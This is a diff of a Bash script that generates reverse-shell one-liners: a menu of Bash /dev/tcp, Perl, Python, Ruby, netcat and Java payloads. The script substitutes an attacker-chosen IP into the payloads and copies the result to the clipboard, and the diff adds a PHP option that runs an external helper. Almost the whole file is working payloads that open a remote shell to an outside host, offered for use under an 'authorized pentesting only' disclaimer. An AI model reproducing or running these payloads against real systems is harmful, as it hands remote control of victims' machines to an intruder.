@@ -1,14 +1,15 @@
 #!/bin/bash
 
 # Define the options and commands
-options=("Bash" "PERL" "Python" "Ruby" "Netcat" "Java")
+options=("Bash" "PERL" "Python" "Ruby" "Netcat" "Java" "PHP")
 commands=(
     "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
     "perl -e 'use Socket;\$i=\"10.0.0.1\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
-    "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+    "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
     "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
     "nc -e /bin/sh 10.0.0.1 1234"
     "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\np.waitFor()"
+    "" # Placeholder for PHP
 )
 
 # Display the options
@@ -21,27 +22,52 @@ done
 # Read the user's choice
 read -p "Enter the number of your choice: " choice
 
-# Ask the user for the IP address
-echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
-read -p "Enter the IP for the shells: " ip_address
-
-# Replace the placeholder IP with the user-provided IP
-for i in "${!commands[@]}"; do
-    commands[$i]="${commands[$i]//10.0.0.1/$ip_address}"
-done
-
-# Validate the choice and copy to clipboard
-if [[ "$choice" -gt 0 && "$choice" -le "${#options[@]}" ]]; then
-    selected_command="${commands[$((choice-1))]}"
-    echo "$selected_command" | xclip -selection clipboard
-    
-    echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
-    echo -e "\033[1;33mCommand copied to clipboard:\033[0m"
-    echo -e "\033[1;35m$selected_command\033[0m"
-else
+# Validate the choice
+if [[ "$choice" -lt 1 || "$choice" -gt "${#options[@]}" ]]; then
     echo -e "\033[1;31mInvalid option. Exiting.\033[0m"
     exit 1
 fi
 
+# Get the selected option
+selected_option="${options[$((choice-1))]}"
+
+# If the option is PHP, execute the script and exit
+if [[ "$selected_option" == "PHP" ]]; then
+    /opt/4rji/bin/getshellphp
+    exit 0
+fi
+
+# Prompt the user for the IP address
 echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
+read -p "Enter the IP for the shells: " ip_address
+
+# Replace the placeholder IP with the user-provided IP in the commands
+for i in "${!commands[@]}"; do
+    if [[ "${options[$i]}" != "PHP" ]]; then
+        commands[$i]="${commands[$i]//10.0.0.1/$ip_address}"
+    fi
+done
+
+# Get the selected command
+selected_command="${commands[$((choice-1))]}"
+
+# If a command exists for the selected option, copy it to the clipboard
+if [[ -n "$selected_command" ]]; then
+    echo "$selected_command" | xclip -selection clipboard
+
+    echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
+    echo -e "\033[1;33mCommand copied to clipboard:\033[0m"
+    echo -e "\033[1;35m$selected_command\033[0m"
+else
+    echo -e "\033[1;31mNo command available for the selected option.\033[0m"
+    exit 1
+fi
+
+echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
+
+
+
+
+
+
 echo -e "\033[1;36mADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.\033[0m"
